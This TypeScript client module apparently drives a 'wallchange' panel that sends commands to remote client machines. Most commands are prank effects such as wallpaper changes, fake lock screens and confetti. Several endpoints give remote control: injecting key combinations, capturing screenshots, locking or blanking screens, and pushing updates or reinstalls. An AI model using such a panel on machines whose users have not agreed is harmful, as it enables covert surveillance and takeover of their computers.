export const BASE_URL = "https://wallchange.codeky.fr";

export interface Client {
  id: string;
  hostname?: string;
  os?: string;
  uptime?: string;
  cpu?: string;
  ram?: string;
  version?: string;
  locked?: boolean;
}

export interface LoginResponse {
  status: string;
  token: string;
  type: string;
}

export interface ImageStatEntry {
  hash: string;
  stored_path: string;
  original_name: string;
  mime: string;
  size_bytes: number;
  first_seen_at: number;
  last_seen_at: number;
  upload_count: number;
}

export interface ImageStatsSummary {
  total_uploads: number;
  total_unique_images: number;
  total_duplicate_uploads: number;
  total_bytes_uploaded: number;
  duplicate_ratio: number;
  average_upload_size: number;
}

export interface FeatureLeaderboardUser {
  user: string;
  total_commands: number;
  first_seen_at?: number;
  last_seen_at?: number;
  last_command?: string;
  commands?: Record<string, number>;
}

export interface FeatureLeaderboardEntry {
  feature: string;
  count: number;
}

export interface FeatureRecentEvent {
  timestamp: number;
  user: string;
  command: string;
  details: string;
}

export interface FeatureStatsSummary {
  total_commands: number;
  unique_users: number;
  feature_kinds: number;
  recent_events_count: number;
}

export interface FeatureStatsPayload {
  version: number;
  created_at: number;
  updated_at: number;
  total_commands: number;
  summary: FeatureStatsSummary;
  leaderboards: {
    top_users: FeatureLeaderboardUser[];
    top_features: FeatureLeaderboardEntry[];
  };
  commands: Record<string, number>;
  users: Record<string, unknown>;
  recent_events: FeatureRecentEvent[];
}

export interface ImageStatsResponse {
  version: number;
  created_at: number;
  updated_at: number;
  last_upload_at: number;
  total_uploads: number;
  total_unique_images: number;
  total_duplicate_uploads: number;
  total_bytes_uploaded: number;
  total_client_deliveries: number;
  images: ImageStatEntry[];
  top_images: ImageStatEntry[];
  summary: ImageStatsSummary;
  feature_stats?: FeatureStatsPayload;
}

let authToken: string | null = sessionStorage.getItem('wallchange_token');
let userRole: string | null = sessionStorage.getItem('wallchange_role');

const getHeaders = () => {
  const headers: HeadersInit = {};
  if (authToken) {
    headers['Authorization'] = `Bearer ${authToken}`;
  }
  return headers;
};

const handleResponse = async (response: Response) => {
  if (response.status === 401) {
    authToken = null;
    userRole = null;
    sessionStorage.removeItem('wallchange_token');
    sessionStorage.removeItem('wallchange_role');
    window.dispatchEvent(new CustomEvent('wallchange:auth-lost'));
    throw new Error("Unauthorized");
  }
  if (response.status === 429) throw new Error("Rate limit: Please wait 10s");
  if (!response.ok) throw new Error(await response.text());
  return response;
};

export const api = {
  setAuth: (token: string, type: string) => {
    authToken = token;
    userRole = type;
    sessionStorage.setItem('wallchange_token', token);
    sessionStorage.setItem('wallchange_role', type);
  },

  getToken: () => authToken,
  isAdmin: () => userRole === 'admin',

  getRole: () => {
    return userRole || sessionStorage.getItem('wallchange_role');
  },

  logout: () => {
    authToken = null;
    userRole = null;
    sessionStorage.removeItem('wallchange_token');
    sessionStorage.removeItem('wallchange_role');
  },

  login: async (user: string, pass: string): Promise<LoginResponse> => {
    const body = new URLSearchParams({ user, pass });
    const response = await fetch(`${BASE_URL}/api/login`, {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      body: body.toString(),
    });
    if (!response.ok) throw new Error('Login failed');
    const data = await response.json();
    if (data.token) {
        api.setAuth(data.token, data.type);
    }
    return data;
  },

  getVersion: async (): Promise<string> => {
    const response = await fetch(`${BASE_URL}/api/version`);
    return response.text();
  },

  listClients: async (): Promise<Client[]> => {
    const response = await fetch(`${BASE_URL}/api/list`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.json();
  },

  changeWallpaper: async (id: string, url: string): Promise<string> => {
    let query = `${BASE_URL}/api/send?id=${id}&url=${encodeURIComponent(url)}`;
    
    const response = await fetch(query, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  drunk: async (id: string): Promise<string> => {
    const response = await fetch(`${BASE_URL}/api/drunk?id=${id}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  uploadWallpaper: async (id: string | undefined, file: File): Promise<string> => {
    const formData = new FormData();
    formData.append("file", file);
    
    const params = new URLSearchParams();
    if (id) params.append("id", id);
    
    const query = params.toString() ? `?${params.toString()}` : "";

    const response = await fetch(`${BASE_URL}/api/upload${query}`, {
      method: "POST",
      headers: getHeaders(),
      body: formData,
    });
    await handleResponse(response);
    return response.text();
  },

  uploadMarquee: async (id: string, file: File): Promise<string> => {
    const formData = new FormData();
    formData.append("file", file);
    const response = await fetch(`${BASE_URL}/api/upload?id=${id}&type=marquee`, {
      method: "POST",
      headers: getHeaders(),
      body: formData,
    });
    await handleResponse(response);
    return response.text();
  },

  uploadCover: async (id: string, file: File): Promise<string> => {
    const formData = new FormData();
    formData.append("file", file);
    const response = await fetch(`${BASE_URL}/api/upload?id=${id}&type=cover`, {
      method: "POST",
      headers: getHeaders(),
      body: formData,
    });
    await handleResponse(response);
    return response.text();
  },

  uploadFile: async (file: File): Promise<string> => {
    const formData = new FormData();
    formData.append("file", file);
    const response = await fetch(`${BASE_URL}/api/upload`, {
      method: "POST",
      headers: getHeaders(),
      body: formData,
    });
    await handleResponse(response);
    return response.text();
  },

  getImageStats: async (): Promise<ImageStatsResponse> => {
    const response = await fetch(`${BASE_URL}/api/stats`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.json();
  },

  triggerUpdate: async (id: string): Promise<string> => {
    const response = await fetch(`${BASE_URL}/api/update?id=${id}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  executeKey: async (id: string, combo: string): Promise<string> => {
    const response = await fetch(`${BASE_URL}/api/key?id=${id}&combo=${encodeURIComponent(combo)}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  requestScreenshot: async (id: string): Promise<string> => {
    const response = await fetch(`${BASE_URL}/api/screenshot?id=${id}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  getLatestScreenshot: async (id: string, timestamp: number): Promise<Blob> => {
    const response = await fetch(`${BASE_URL}/api/screenshot/latest?id=${encodeURIComponent(id)}&t=${timestamp}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.blob();
  },

  uninstallClient: async (id: string, _from: string): Promise<string> => {
    const response = await fetch(`${BASE_URL}/api/uninstall?id=${id}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  reverseScreen: async (id: string): Promise<string> => {
    const response = await fetch(`${BASE_URL}/api/reverse?id=${id}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  showDesktop: async (id: string): Promise<string> => {
    const response = await fetch(`${BASE_URL}/api/showdesktop?id=${id}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  marquee: async (id: string, url: string): Promise<string> => {
    const response = await fetch(`${BASE_URL}/api/marquee?id=${id}&url=${encodeURIComponent(url)}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  cover: async (id: string, url: string): Promise<string> => {
    const response = await fetch(`${BASE_URL}/api/cover?id=${id}&url=${encodeURIComponent(url)}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  screenOff: async (id: string, duration?: number): Promise<string> => {
    let url = `${BASE_URL}/api/screen-off?id=${id}`;
    if (duration) {
      url += `&duration=${duration}`;
    }
    const response = await fetch(url, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  particles: async (id: string, url: string): Promise<string> => {
    const response = await fetch(`${BASE_URL}/api/particles?id=${id}&url=${encodeURIComponent(url)}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  clones: async (id: string): Promise<string> => {
    const response = await fetch(`${BASE_URL}/api/clones?id=${id}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  faketerminal: async (id: string): Promise<string> => {
    const response = await fetch(`${BASE_URL}/api/faketerminal?id=${id}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  confetti: async (id: string, url?: string): Promise<string> => {
    const query = url ? `&url=${encodeURIComponent(url)}` : "";
    const response = await fetch(`${BASE_URL}/api/confetti?id=${id}${query}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  spotlight: async (id: string): Promise<string> => {
    const response = await fetch(`${BASE_URL}/api/spotlight?id=${id}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  invert: async (id: string): Promise<string> => {
    const response = await fetch(`${BASE_URL}/api/invert?id=${id}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  textscreen: async (id: string, text?: string): Promise<string> => {
    const query = text ? `&text=${encodeURIComponent(text)}` : "";
    const response = await fetch(`${BASE_URL}/api/textscreen?id=${id}${query}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  wavescreen: async (id: string): Promise<string> => {
    const response = await fetch(`${BASE_URL}/api/wavescreen?id=${id}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  dvdbounce: async (id: string, url?: string): Promise<string> => {
    const query = url ? `&url=${encodeURIComponent(url)}` : "";
    const response = await fetch(`${BASE_URL}/api/dvdbounce?id=${id}${query}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  fireworks: async (id: string): Promise<string> => {
    const response = await fetch(`${BASE_URL}/api/fireworks?id=${id}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  uploadParticles: async (id: string, file: File): Promise<string> => {
    const formData = new FormData();
    formData.append("file", file);
    const response = await fetch(`${BASE_URL}/api/upload?id=${id}&type=particles`, {
      method: "POST",
      headers: getHeaders(),
      body: formData,
    });
    await handleResponse(response);
    return response.text();
  },

  lock: async (id: string): Promise<string> => {
    const response = await fetch(`${BASE_URL}/api/lock?id=${id}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  nyancat: async (id: string): Promise<string> => {
    const response = await fetch(`${BASE_URL}/api/nyancat?id=${id}`, {
        headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  fly: async (id: string): Promise<string> => {
      const response = await fetch(`${BASE_URL}/api/fly?id=${id}`, {
          headers: getHeaders(),
      });
      await handleResponse(response);
      return response.text();
  },

  blackout: async (id: string): Promise<string> => {
    const response = await fetch(`${BASE_URL}/api/blackout?id=${id}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  fakelock: async (id: string): Promise<string> => {
    const response = await fetch(`${BASE_URL}/api/fakelock?id=${id}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  },

  reinstall: async (id: string): Promise<string> => {
    const response = await fetch(`${BASE_URL}/api/reinstall?id=${id}`, {
      headers: getHeaders(),
    });
    await handleResponse(response);
    return response.text();
  }
};
